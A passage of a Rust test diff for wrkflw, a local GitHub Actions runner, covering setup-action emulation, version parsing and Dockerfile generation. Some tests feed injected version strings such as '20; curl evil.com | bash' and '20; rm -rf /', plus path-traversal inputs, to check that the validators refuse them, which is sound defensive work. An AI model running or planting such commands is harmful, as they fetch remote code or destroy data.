+    fn a_reused_pass_keeps_the_actions_it_did_not_run() {
+        let mut result = JobResult::reused(
+            acceleration::StoredJob {
+                name: "test".to_string(),
+                canonical_name: "test".to_string(),
+                outputs: HashMap::new(),
+                actions_not_run: Vec::new(),
+                repeated_from: None,
+            },
+            "reused",
+            "reused",
+        );
+        result.steps = vec![StepResult::new(
+            "Upload coverage".to_string(),
+            StepStatus::Success,
+            String::new(),
+        )
+        .without_running(["codecov/codecov-action@v4".to_string()])];
+
+        let stored = stored_jobs(&[result]);
+        assert_eq!(
+            stored[0].actions_not_run,
+            [crate::action_fidelity::UnexecutedAction {
+                step: "Upload coverage".to_string(),
+                uses: "codecov/codecov-action@v4".to_string(),
+            }]
+        );
+        // Reusing it again reports the action as not run, not a clean pass.
+        let reused = JobResult::reused(stored[0].clone(), "reused", "reused");
+        assert_eq!(
+            reused.steps[0].actions_not_run,
+            ["codecov/codecov-action@v4"]
+        );
+    }
+
+    #[test]
+    fn a_reused_fold_still_says_which_leg_it_repeated() {
+        let mut leg = JobResult::skipped("b (os: windows-latest)", "b", "");
+        leg.status = JobStatus::Success;
+        leg.repeated_from = Some("b (os: ubuntu-latest)".to_string());
+        let stored = stored_jobs(&[leg]);
+        assert_eq!(
+            stored[0].repeated_from.as_deref(),
+            Some("b (os: ubuntu-latest)")
+        );
+        let reused = JobResult::reused(stored[0].clone(), "reused", "reused");
+        assert_eq!(
+            reused.repeated_from.as_deref(),
+            Some("b (os: ubuntu-latest)")
+        );
+    }
+
+    #[tokio::test]
+    async fn a_setup_action_built_into_the_image_ran() {
+        let node = vec!["node".to_string()];
+        let result = run_uses_step("actions/setup-node", &node, false).await;
+        assert_eq!(result.status, StepStatus::Success);
+        assert!(result.actions_not_run.is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_setup_action_missing_from_the_image_did_not_run() {
+        // A job container, or a composite action, gets no setup runtime.
+        let result = run_uses_step("actions/setup-node", &[], false).await;
+        assert_eq!(result.actions_not_run, ["actions/setup-node"]);
+        // Another language's runtime doesn't count.
+        let python = vec!["python".to_string()];
+        let result = run_uses_step("actions/setup-node", &python, false).await;
+        assert_eq!(result.actions_not_run, ["actions/setup-node"]);
+    }
+
+    #[tokio::test]
+    async fn a_setup_action_under_emulation_did_not_run() {
+        let node = vec!["node".to_string()];
+        let result = run_uses_step("actions/setup-node", &node, true).await;
+        assert_eq!(result.actions_not_run, ["actions/setup-node"]);
+    }
+
     // --- NativeDocker execute_step integration tests ---
 
     #[tokio::test]
@@ -9035,6 +9558,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -9087,6 +9611,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -9144,6 +9669,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -9194,6 +9720,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -9245,6 +9772,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -9295,6 +9823,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -9343,6 +9872,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -9457,7 +9987,8 @@ runs:
         let runtimes = detect_setup_runtimes(&steps);
         assert_eq!(runtimes.len(), 1);
         assert_eq!(runtimes[0].language, "node");
-        assert_eq!(runtimes[0].version, "20");
+        // No version: the runner's own Node, as setup-node keeps it.
+        assert_eq!(runtimes[0].version, RUNNER_NODE_MAJOR);
         assert!(!runtimes[0].install_script.is_empty());
     }
 
@@ -9643,7 +10174,9 @@ runs:
 
     #[test]
     fn get_install_script_returns_nonempty_for_known_languages() {
-        for lang in &["node", "php", "python", "go", "java", "dotnet", "rust"] {
+        for lang in &[
+            "node", "php", "python", "go", "java", "dotnet", "rust", "uv",
+        ] {
             let script = get_install_script(lang, "latest");
             assert!(
                 !script.is_empty(),
@@ -9835,7 +10368,7 @@ runs:
             version: "20".to_string(),
             install_script: get_install_script("node", "20"),
         }];
-        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
+        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest", None);
         assert!(df.starts_with("FROM ubuntu:latest\n"));
         assert!(df.contains("nodesource"));
         // Everything in a single RUN layer
@@ -9849,7 +10382,7 @@ runs:
             version: "20".to_string(),
             install_script: get_install_script("node", "20"),
         }];
-        let df = generate_combined_dockerfile(&runtimes, "catthehacker/ubuntu:act-latest");
+        let df = generate_combined_dockerfile(&runtimes, "catthehacker/ubuntu:act-latest", None);
         assert!(df.ends_with("ENV PATH=/usr/local/bin:/usr/bin:$PATH\n"));
     }
 
@@ -9867,11 +10400,690 @@ runs:
                 install_script: get_install_script("python", "3.12"),
             },
         ];
-        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
+        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest", None);
         // Everything in a single RUN layer
         assert_eq!(df.matches("RUN ").count(), 1);
         assert!(df.contains("nodesource"));
-        assert!(df.contains("deadsnakes"));
+        assert!(df.contains("uv python install '3.12'"));
+    }
+
+    #[test]
+    fn python_versions_are_asked_of_uv_as_setup_python_spells_them() {
+        assert_eq!(uv_python_request("3.12"), "3.12");
+        assert_eq!(uv_python_request("3.13t"), "3.13t");
+        assert_eq!(uv_python_request("3.12.4"), "3.12.4");
+        assert_eq!(uv_python_request("3.x"), "3");
+        assert_eq!(uv_python_request("3.14-dev"), "3.14");
+        assert_eq!(uv_python_request("pypy-3.11"), "pypy@3.11");
+        assert_eq!(uv_python_request("pypy3.10"), "pypy@3.10");
+        assert_eq!(uv_python_request("pypy-3.11-v7.3.17"), "pypy@3.11");
+        assert_eq!(uv_python_request("graalpy-24.1"), "graalpy@24.1");
+    }
+
+    #[test]
+    fn the_python_install_links_the_interpreter_and_pip_where_steps_find_them() {
+        let script = get_install_script("python", "pypy-3.11");
+        assert!(script.contains("astral.sh/uv/install.sh"));
+        assert!(script.contains("uv python install 'pypy@3.11'"));
+        assert!(script.contains("/usr/local/bin/python3"));
+        assert!(script.contains("/usr/local/bin/pip"));
+        assert!(!script.contains("deadsnakes"));
+        assert!(!script.contains("get-pip"));
+    }
+
+    #[test]
+    fn setup_uv_installs_the_requested_release() {
+        let with = HashMap::from([("version".to_string(), "0.9.30".to_string())]);
+        let steps = vec![make_step_uses("astral-sh/setup-uv@v9", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        assert_eq!(runtimes[0].language, "uv");
+        assert!(runtimes[0]
+            .install_script
+            .contains("https://astral.sh/uv/0.9.30/install.sh"));
+        let latest = detect_setup_runtimes(&[make_step_uses("astral-sh/setup-uv@v9", None)]);
+        assert!(latest[0]
+            .install_script
+            .contains("https://astral.sh/uv/install.sh"));
+    }
+
+    #[test]
+    fn version_files_are_read_as_the_hosted_setup_actions_read_them() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("pyproject.toml"),
+            "[project]\nname = \"x\"\nrequires-python = \">=3.10\"\n",
+        )
+        .unwrap();
+        std::fs::write(root.join(".python-version"), "# pinned\n3.12.4\n").unwrap();
+        std::fs::write(root.join(".nvmrc"), "v20.11.0\n").unwrap();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"engines": {"node": ">=18.17 <21"}}"#,
+        )
+        .unwrap();
+        std::fs::write(root.join("go.mod"), "module m\n\ngo 1.22.3\n").unwrap();
+        assert_eq!(
+            version_from_file(root, "pyproject.toml").as_deref(),
+            Some(">=3.10")
+        );
+        assert_eq!(
+            version_from_file(root, ".python-version").as_deref(),
+            Some("3.12.4")
+        );
+        assert_eq!(
+            version_from_file(root, ".nvmrc").as_deref(),
+            Some("20.11.0")
+        );
+        assert_eq!(
+            version_from_file(root, "package.json").as_deref(),
+            Some("20")
+        );
+        assert_eq!(version_from_file(root, "go.mod").as_deref(), Some("1.22.3"));
+        assert_eq!(version_from_file(root, "missing.txt"), None);
+
+        let with = HashMap::from([(
+            "python-version-file".to_string(),
+            "pyproject.toml".to_string(),
+        )]);
+        let steps = vec![make_step_uses("actions/setup-python@v5", Some(with))];
+        let runtimes = detect_setup_runtimes_in(&steps, root);
+        assert_eq!(runtimes[0].version, ">=3.10");
+        assert!(runtimes[0]
+            .install_script
+            .contains("uv python install '>=3.10'"));
+
+        // An explicit version wins over the file.
+        let with = HashMap::from([
+            ("python-version".to_string(), "3.13".to_string()),
+            (
+                "python-version-file".to_string(),
+                "pyproject.toml".to_string(),
+            ),
+        ]);
+        let steps = vec![make_step_uses("actions/setup-python@v5", Some(with))];
+        assert_eq!(detect_setup_runtimes_in(&steps, root)[0].version, "3.13");
+    }
+
+    #[test]
+    fn a_version_file_must_stay_inside_the_repository() {
+        let outer = tempfile::tempdir().unwrap();
+        let root = outer.path().join("repo");
+        std::fs::create_dir(&root).unwrap();
+        std::fs::write(outer.path().join("secret"), "3.12\n").unwrap();
+        std::fs::write(root.join(".python-version"), "3.11\n").unwrap();
+        assert_eq!(
+            version_from_file(&root, "./.python-version").as_deref(),
+            Some("3.11")
+        );
+        assert_eq!(version_from_file(&root, "../secret"), None);
+        let absolute = outer.path().join("secret");
+        assert_eq!(version_from_file(&root, absolute.to_str().unwrap()), None);
+        #[cfg(unix)]
+        {
+            std::os::unix::fs::symlink(&absolute, root.join("linked")).unwrap();
+            assert_eq!(version_from_file(&root, "linked"), None);
+        }
+    }
+
+    #[test]
+    fn requires_python_is_read_from_the_project_table_without_its_comment() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("pyproject.toml"),
+            "[tool.other]\nrequires-python = \"==2.7\"\n\n[project]\n\
+             requires-python = '>=3.10'  # oldest we test\n",
+        )
+        .unwrap();
+        assert_eq!(
+            version_from_file(dir.path(), "pyproject.toml").as_deref(),
+            Some(">=3.10")
+        );
+    }
+
+    #[test]
+    fn a_version_that_reads_as_an_option_or_a_parent_is_refused() {
+        assert!(is_safe_version("1.22.3"));
+        assert!(is_safe_version("nightly-2024-01-01"));
+        assert!(!is_safe_version("--help"));
+        assert!(!is_safe_version("-1"));
+        assert!(!is_safe_version(".."));
+        assert!(!is_safe_version("1..2"));
+    }
+
+    #[test]
+    fn node_version_takes_a_leading_v() {
+        let with = HashMap::from([("node-version".to_string(), "v20".to_string())]);
+        let detected =
+            detect_setup_runtimes(&[make_step_uses("actions/setup-node@v4", Some(with))]);
+        assert_eq!(detected[0].version, "20");
+        assert!(detected[0].install_script.contains("setup_20.x"));
+    }
+
+    fn setup_version(uses: &str, with: &[(&str, &str)], root: &Path) -> Option<String> {
+        let with: HashMap<String, String> = with
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect();
+        let steps = vec![make_step_uses(uses, Some(with))];
+        detect_setup_in(&steps, root)
+            .runtimes
+            .into_iter()
+            .next()
+            .map(|rt| rt.version)
+    }
+
+    #[test]
+    fn an_empty_version_input_reads_the_version_file() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".nvmrc"), "18.20.4\n").unwrap();
+        let version = setup_version(
+            "actions/setup-node@v4",
+            &[("node-version", " "), ("node-version-file", ".nvmrc")],
+            dir.path(),
+        );
+        assert_eq!(version.as_deref(), Some("18.20.4"));
+    }
+
+    #[test]
+    fn setup_python_with_no_version_reads_dot_python_version() {
+        let dir = tempfile::tempdir().unwrap();
+        assert_eq!(
+            setup_version("actions/setup-python@v5", &[], dir.path()).as_deref(),
+            Some("3.11")
+        );
+        std::fs::write(dir.path().join(".python-version"), "3.13\n").unwrap();
+        assert_eq!(
+            setup_version("actions/setup-python@v5", &[], dir.path()).as_deref(),
+            Some("3.13")
+        );
+        // A specifier written with spaces, as setup-python takes it.
+        assert_eq!(
+            setup_version(
+                "actions/setup-python@v5",
+                &[("python-version", ">= 3.10")],
+                dir.path()
+            )
+            .as_deref(),
+            Some(">=3.10")
+        );
+    }
+
+    #[test]
+    fn setup_node_with_no_version_keeps_the_runners_node() {
+        let dir = tempfile::tempdir().unwrap();
+        assert_eq!(
+            setup_version("actions/setup-node@v4", &[], dir.path()).as_deref(),
+            Some(RUNNER_NODE_MAJOR)
+        );
+    }
+
+    #[test]
+    fn a_pinned_node_release_is_installed_exactly() {
+        let exact = get_install_script("node", "20.11.0");
+        assert!(
+            exact.contains("nodejs.org/dist/v20.11.0/node-v20.11.0-linux-"),
+            "{exact}"
+        );
+        assert!(!exact.contains("nodesource"));
+        assert!(get_install_script("node", "20").contains("setup_20.x"));
+    }
+
+    #[test]
+    fn go_pre_releases_and_oldstable_are_named_as_go_dev_names_them() {
+        assert!(get_install_script("go", "1.22rc1").contains("GO=go1.22rc1 "));
+        assert!(get_install_script("go", "1.22.0-rc.1").contains("GO=go1.22rc1 "));
+        assert!(get_install_script("go", "1.23beta2").contains("GO=go1.23beta2 "));
+        #[cfg(unix)]
+        {
+            // go.dev repeats a release's version in each of its files, so
+            // the second match is still the newest release.
+            let listing = r#"[
+ {"version": "go1.27.3", "stable": true, "files": [
+  {"filename": "a", "version": "go1.27.3"},
+  {"filename": "b", "version": "go1.27.3"}]},
+ {"version": "go1.26.10", "stable": true, "files": [
+  {"filename": "c", "version": "go1.26.10"}]}
+]"#;
+            let dir = tempfile::tempdir().unwrap();
+            let json = dir.path().join("dl.json");
+            std::fs::write(&json, listing).unwrap();
+            let script = get_install_script("go", "oldstable");
+            let start = script.find("\"$(curl").unwrap();
+            let end = start + script[start..].find(")\"").unwrap() + 2;
+            let lookup = script[start..end].replace(
+                "curl -fsSL 'https://go.dev/dl/?mode=json'",
+                &format!("cat '{}'", json.display()),
+            );
+            let out = std::process::Command::new("sh")
+                .arg("-c")
+                .arg(format!("printf %s {}", lookup))
+                .output()
+                .unwrap();
+            assert_eq!(String::from_utf8_lossy(&out.stdout), "go1.26.10");
+        }
+        // What go.dev can't name is refused before the build, not by it.
+        let dir = tempfile::tempdir().unwrap();
+        for unknown in ["latest", "1.22.x.y", "tip"] {
+            let steps = vec![make_step_uses(
+                "actions/setup-go@v5",
+                Some(HashMap::from([(
+                    "go-version".to_string(),
+                    unknown.to_string(),
+                )])),
+            )];
+            let detection = detect_setup_in(&steps, dir.path());
+            assert!(detection.runtimes.is_empty(), "{unknown}");
+            assert_eq!(detection.not_built, [(0, NotBuilt::Refused)], "{unknown}");
+        }
+    }
+
+    #[test]
+    fn python_pre_releases_reach_uv_in_its_spelling() {
+        assert_eq!(uv_python_request("3.14.0-alpha.1"), "3.14.0a1");
+        assert_eq!(uv_python_request("3.14.0-beta.2"), "3.14.0b2");
+        assert_eq!(uv_python_request("3.14.0-rc.1"), "3.14.0rc1");
+        assert_eq!(uv_python_request("pypy-3.11"), "pypy@3.11");
+    }
+
+    #[test]
+    fn a_longer_key_is_not_requires_python() {
+        let text = "[project]\nrequires-python-extra = \"x\"\nrequires-python = \">=3.9\"\n";
+        assert_eq!(
+            crate::setup_actions::requires_python(text).as_deref(),
+            Some(">=3.9")
+        );
+        assert!(!is_safe_version("3.1\u{0663}"));
+    }
+
+    #[test]
+    fn a_go_line_installs_its_newest_release() {
+        // A full release is fetched by name.
+        let full = get_install_script("go", "1.22.3");
+        assert!(full.contains("GO=go1.22.3 "));
+        // `go 1.22` in go.mod names a line; go.dev has no `go1.22` file.
+        let line = get_install_script("go", "1.22");
+        assert!(
+            line.contains(r#"grep -oE '"go1\.22(\.[0-9]+)*"'"#),
+            "{}",
+            line
+        );
+        assert!(line.contains("test -n \"$GO\""));
+        let stable = get_install_script("go", "stable");
+        assert!(stable.contains(r#"'"go[0-9]+(\.[0-9]+)*"'"#), "{}", stable);
+    }
+
+    #[test]
+    fn a_node_range_resolves_to_the_major_setup_node_would_pick() {
+        assert_eq!(node_major_for_range(">=18.17 <21").as_deref(), Some("20"));
+        assert_eq!(node_major_for_range(">=18 <21.2").as_deref(), Some("21"));
+        assert_eq!(node_major_for_range("<=22.4").as_deref(), Some("22"));
+        assert_eq!(node_major_for_range("^20.11.0").as_deref(), Some("20"));
+        assert_eq!(node_major_for_range("~18.2").as_deref(), Some("18"));
+        assert_eq!(node_major_for_range("20.x").as_deref(), Some("20"));
+        assert_eq!(node_major_for_range("^18 || ^20").as_deref(), Some("20"));
+        assert_eq!(node_major_for_range("18 - 20").as_deref(), Some("20"));
+        assert_eq!(node_major_for_range("18.0.0 - 20.1").as_deref(), Some("20"));
+        assert_eq!(node_major_for_range(">=18").as_deref(), Some("current"));
+        assert_eq!(node_major_for_range("*").as_deref(), Some("current"));
+        assert_eq!(node_major_for_range("20; curl evil.com | bash"), None);
+        assert!(get_install_script("node", "current").contains("setup_current.x"));
+    }
+
+    #[test]
+    fn node_aliases_resolve_to_a_nodesource_channel() {
+        assert_eq!(node_alias("lts/*").as_deref(), Some("lts"));
+        assert_eq!(node_alias("lts/iron").as_deref(), Some("20"));
+        assert_eq!(node_alias("lts/Hydrogen").as_deref(), Some("18"));
+        // setup-node refuses a codename it doesn't know.
+        assert_eq!(node_alias("lts/someday"), None);
+        assert_eq!(node_alias("node").as_deref(), Some("current"));
+        assert_eq!(node_alias("latest").as_deref(), Some("current"));
+        assert_eq!(node_alias("20"), None);
+        assert!(get_install_script("node", "lts").contains("setup_lts.x"));
+
+        // `.nvmrc` holding `lts/*`, the most common content, installs Node.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".nvmrc"), "lts/*\n").unwrap();
+        let with = HashMap::from([("node-version-file".to_string(), ".nvmrc".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-node@v4", Some(with))];
+        let detected = detect_setup_in(&steps, dir.path());
+        assert_eq!(detected.runtimes[0].version, "lts");
+        assert!(detected.not_built.is_empty());
+    }
+
+    #[test]
+    fn a_setup_step_counts_as_run_only_when_the_image_holds_its_version() {
+        let bad = HashMap::from([("node-version".to_string(), "20; rm -rf /".to_string())]);
+        let good = HashMap::from([("node-version".to_string(), "22".to_string())]);
+        let older = HashMap::from([("node-version".to_string(), "18".to_string())]);
+        let refused = detect_setup(&[make_step_uses("actions/setup-node@v4", Some(bad.clone()))]);
+        assert!(refused.runtimes.is_empty());
+        assert_eq!(refused.not_built, [(0, NotBuilt::Refused)]);
+
+        // Whichever comes first, the refused step is the one not run: a
+        // good step doesn't vouch for another step's version.
+        for steps in [
+            vec![
+                make_step_uses("actions/setup-node@v4", Some(bad.clone())),
+                make_step_uses("actions/setup-node@v4", Some(good.clone())),
+            ],
+            vec![
+                make_step_uses("actions/setup-node@v4", Some(good.clone())),
+                make_step_uses("actions/setup-node@v4", Some(bad.clone())),
+            ],
+        ] {
+            let detected = detect_setup(&steps);
+            assert_eq!(detected.runtimes[0].version, "22");
+            let bad_idx = steps
+                .iter()
+                .position(|s| s.with.as_ref() == Some(&bad))
+                .unwrap();
+            assert_eq!(detected.not_built, [(bad_idx, NotBuilt::Refused)]);
+        }
+
+        // The image holds the last version, so an earlier one never ran.
+        let detected = detect_setup(&[
+            make_step_uses("actions/setup-node@v4", Some(older)),
+            make_step_uses("actions/setup-node@v4", Some(good.clone())),
+            make_step_uses("actions/setup-node@v4", Some(good)),
+        ]);
+        assert_eq!(detected.runtimes[0].version, "22");
+        assert_eq!(detected.not_built, [(0, NotBuilt::Superseded)]);
+        let built = BuiltRuntimes {
+            installed: vec!["node".to_string()],
+            not_built: detected.not_built,
+        };
+        assert!(unrun_action_cause("actions/setup-node", &built, true, 0)
+            .unwrap()
+            .contains("another setup step"));
+        assert_eq!(
+            unrun_action_cause("actions/setup-node", &built, true, 1),
+            None
+        );
+        // A composite's steps are not the job's.
+        assert_eq!(
+            unrun_action_cause("actions/setup-node", &built.for_composite(), true, 0),
+            None
+        );
+    }
+
+    #[test]
+    fn a_version_file_without_a_version_is_refused_not_defaulted() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("pyproject.toml"),
+            "[tool.poetry.dependencies]\npython = \"^3.9\"\n",
+        )
+        .unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module m\n").unwrap();
+        for (uses, key, file) in [
+            (
+                "actions/setup-python@v5",
+                "python-version-file",
+                "pyproject.toml",
+            ),
+            (
+                "actions/setup-python@v5",
+                "python-version-file",
+                "missing.txt",
+            ),
+            ("actions/setup-go@v5", "go-version-file", "go.mod"),
+            ("actions/setup-node@v4", "node-version-file", ".nvmrc"),
+        ] {
+            let with = HashMap::from([(key.to_string(), file.to_string())]);
+            let detected = detect_setup_in(&[make_step_uses(uses, Some(with))], dir.path());
+            assert!(detected.runtimes.is_empty(), "{uses} {file}");
+            assert_eq!(
+                detected.not_built,
+                [(0, NotBuilt::Refused)],
+                "{uses} {file}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_requires_python_specifier_reaches_uv_whole() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("pyproject.toml"),
+            "[project]\nrequires-python = \">= 3.9, < 4\"\n",
+        )
+        .unwrap();
+        assert_eq!(
+            version_from_file(dir.path(), "pyproject.toml").as_deref(),
+            Some(">=3.9,<4")
+        );
+        assert!(is_safe_python_spec(">=3.9,<4"));
+        assert!(is_safe_python_spec("~=3.11"));
+        assert!(is_safe_python_spec("==3.12.*"));
+        assert!(!is_safe_python_spec("3.12"));
+        assert!(!is_safe_python_spec(">=3.9'; rm -rf /"));
+        assert!(!is_safe_python_spec(">=3.9 $(id)"));
+    }
+
+    #[test]
+    fn a_node_version_range_is_resolved_and_other_specifiers_are_refused() {
+        let with = HashMap::from([("node-version".to_string(), ">=18 <21".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-node@v4", Some(with))];
+        assert_eq!(detect_setup_runtimes(&steps)[0].version, "20");
+        // Only Python passes a specifier on to its installer.
+        let with = HashMap::from([("go-version".to_string(), ">=1.21".to_string())]);
+        let steps = vec![make_step_uses("actions/setup-go@v5", Some(with))];
+        assert!(detect_setup_runtimes(&steps).is_empty());
+    }
+
+    #[test]
+    fn the_python_install_lets_pip_install_packages() {
+        let script = get_install_script("python", "pypy-3.11");
+        // uv's interpreters carry a PEP 668 marker that makes pip refuse.
+        assert!(script.contains("EXTERNALLY-MANAGED"), "{script}");
+        // The Python that removes it is single-quoted in the shell.
+        assert!(!DROP_EXTERNALLY_MANAGED.contains('\''));
+        let removal = script.find("EXTERNALLY-MANAGED").unwrap();
+        assert!(removal < script.find("ensurepip").unwrap(), "{script}");
+    }
+
+    #[test]
+    fn a_combined_image_has_the_runner_tools_jobs_expect() {
+        let python = vec![SetupRuntime {
+            language: "python".to_string(),
+            version: "3.12".to_string(),
+            install_script: get_install_script("python", "3.12"),
+        }];
+        let df = generate_combined_dockerfile(&python, "ubuntu:latest", None);
+        assert!(df.contains("build-essential less"), "{df}");
+        assert!(df.contains("command -v node"), "{df}");
+        assert!(
+            df.contains(&format!("setup_{}.x", RUNNER_NODE_MAJOR)),
+            "{df}"
+        );
+        assert_eq!(df.matches("RUN ").count(), 1);
+
+        // setup-node's own version is the only Node then.
+        let node = vec![SetupRuntime {
+            language: "node".to_string(),
+            version: "18".to_string(),
+            install_script: get_install_script("node", "18"),
+        }];
+        let df = generate_combined_dockerfile(&node, "ubuntu:latest", None);
+        assert!(!df.contains("command -v node"), "{df}");
+        assert_eq!(df.matches("nodesource").count(), 1, "{df}");
+    }
+
+    #[test]
+    fn images_for_floating_versions_are_rebuilt_weekly() {
+        let rt = |language: &str, version: &str| SetupRuntime {
+            language: language.to_string(),
+            version: version.to_string(),
+            install_script: String::new(),
+        };
+        for version in [
+            "latest",
+            "stable",
+            "oldstable",
+            "lts/*",
+            "3.x",
+            ">=3.10",
+            "^18 || >=20",
+            "nightly",
+            "3.14-dev",
+            "pypy-3.11",
+            "current",
+        ] {
+            assert!(is_floating_version(version), "{version}");
+        }
+        for version in [
+            "3.12", "3.12.4", "20", "1.22.3", "0.9.30", "3.13t", "1.80.0",
+        ] {
+            assert!(!is_floating_version(version), "{version}");
+        }
+        let monday = chrono::DateTime::parse_from_rfc3339("2026-11-09T10:00:00Z")
+            .unwrap()
+            .with_timezone(&chrono::Utc);
+        let sunday = monday + chrono::Duration::days(6);
+        let next = monday + chrono::Duration::days(7);
+        let floating = [rt("go", "oldstable"), rt("python", "3.12")];
+        assert_eq!(
+            floating_versions_week(&floating, monday).as_deref(),
+            Some("2026-W46")
+        );
+        assert_eq!(
+            floating_versions_week(&floating, sunday),
+            floating_versions_week(&floating, monday)
+        );
+        assert_ne!(
+            floating_versions_week(&floating, next),
+            floating_versions_week(&floating, monday)
+        );
+        assert_eq!(
+            floating_versions_week(&[rt("python", "3.12")], monday),
+            None
+        );
+    }
+
+    #[test]
+    fn what_pip_installs_runs_by_name() {
+        let python = vec![SetupRuntime {
+            language: "python".to_string(),
+            version: "3.12".to_string(),
+            install_script: get_install_script("python", "3.12"),
+        }];
+        let df = generate_combined_dockerfile(&python, "ubuntu:latest", None);
+        assert!(
+            df.contains(&format!("ENV PATH={}:", PYTHON_SCRIPTS_DIR)),
+            "{df}"
+        );
+        assert!(df.contains(&format!("\" {}", PYTHON_SCRIPTS_DIR)), "{df}");
+        if std::env::var_os("WRKFLW_PRINT_DOCKERFILE").is_some() {
+            println!("{df}");
+        }
+    }
+
+    /// Piped into a shell, a download that fails is an empty script that
+    /// succeeds. Every installer is saved first, so the build fails instead.
+    #[test]
+    fn no_installer_is_piped_into_a_shell() {
+        for script in [
+            get_install_script("node", "20"),
+            get_install_script("php", "8.3"),
+            get_install_script("python", "3.12"),
+            uv_install_command("0.9.30"),
+            runner_node_install(),
+        ] {
+            for shell in ["| sh", "| bash", "| php"] {
+                assert!(!script.contains(shell), "{script}");
+            }
+        }
+        assert!(uv_install_command("latest").contains("/usr/local/bin/uv --version"));
+        assert!(get_install_script("node", "20").contains("node --version"));
+    }
+
+    #[test]
+    fn setup_uv_is_installed_before_python_at_its_own_version() {
+        let python = HashMap::from([("python-version".to_string(), "3.12".to_string())]);
+        let uv = HashMap::from([("version".to_string(), "0.9.30".to_string())]);
+        let steps = vec![
+            make_step_uses("actions/setup-python@v5", Some(python)),
+            make_step_uses("astral-sh/setup-uv@v9", Some(uv)),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        let order: Vec<&str> = runtimes.iter().map(|r| r.language.as_str()).collect();
+        assert_eq!(order, ["uv", "python"]);
+        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest", None);
+        let pinned = df.find("astral.sh/uv/0.9.30/install.sh").unwrap();
+        let python_install = df.find("uv python install").unwrap();
+        assert!(pinned < python_install, "{df}");
+        // setup-uv replaces a uv the image may already have.
+        assert!(!uv_install_command("0.9.30").contains("command -v uv"));
+        // Python's own install keeps the uv setup-uv put there.
+        assert!(get_install_script("python", "3.12").contains("command -v uv"));
+    }
+
+    #[test]
+    fn a_combined_image_tag_holds_only_tag_characters() {
+        let runtimes = vec![SetupRuntime {
+            language: "python".to_string(),
+            version: ">=3.9,<4".to_string(),
+            install_script: String::new(),
+        }];
+        let tag = combined_image_tag(&runtimes, "FROM x\n");
+        let name = tag.strip_prefix(COMBINED_IMAGE_PREFIX).unwrap();
+        assert!(
+            name.chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_')),
+            "{tag}"
+        );
+    }
+
+    #[test]
+    fn a_setup_action_runs_only_when_its_runtime_is_in_the_image() {
+        let node = BuiltRuntimes {
+            installed: vec!["node".to_string()],
+            not_built: Vec::new(),
+        };
+        assert_eq!(
+            unrun_action_cause("actions/setup-node", &node, true, 0),
+            None
+        );
+        assert!(unrun_action_cause("actions/setup-python", &node, true, 0)
+            .unwrap()
+            .contains("not in the job's image"));
+        assert!(unrun_action_cause("actions/setup-node", &node, false, 0)
+            .unwrap()
+            .contains("emulation"));
+        assert_eq!(
+            unrun_action_cause("codecov/codecov-action", &node, true, 0),
+            Some("no implementation in wrkflw")
+        );
+        // A version wrkflw couldn't install is named as the reason, not a
+        // job container or a composite action.
+        let refused = BuiltRuntimes {
+            installed: Vec::new(),
+            not_built: vec![(0, NotBuilt::Refused)],
+        };
+        assert!(unrun_action_cause("actions/setup-node", &refused, true, 0)
+            .unwrap()
+            .contains("version it asks for"));
+    }
+
+    #[test]
+    fn combined_image_tag_changes_with_the_base_image_id() {
+        let runtimes = vec![SetupRuntime {
+            language: "node".to_string(),
+            version: "20".to_string(),
+            install_script: get_install_script("node", "20"),
+        }];
+        let before = generate_combined_dockerfile(&runtimes, "ubuntu:latest", Some("sha256:aaa"));
+        let after = generate_combined_dockerfile(&runtimes, "ubuntu:latest", Some("sha256:bbb"));
+        assert!(before.contains("# base image id: sha256:aaa"));
+        assert_ne!(
+            combined_image_tag(&runtimes, &before),
+            combined_image_tag(&runtimes, &after)
+        );
+        // A comment doesn't change what gets built.
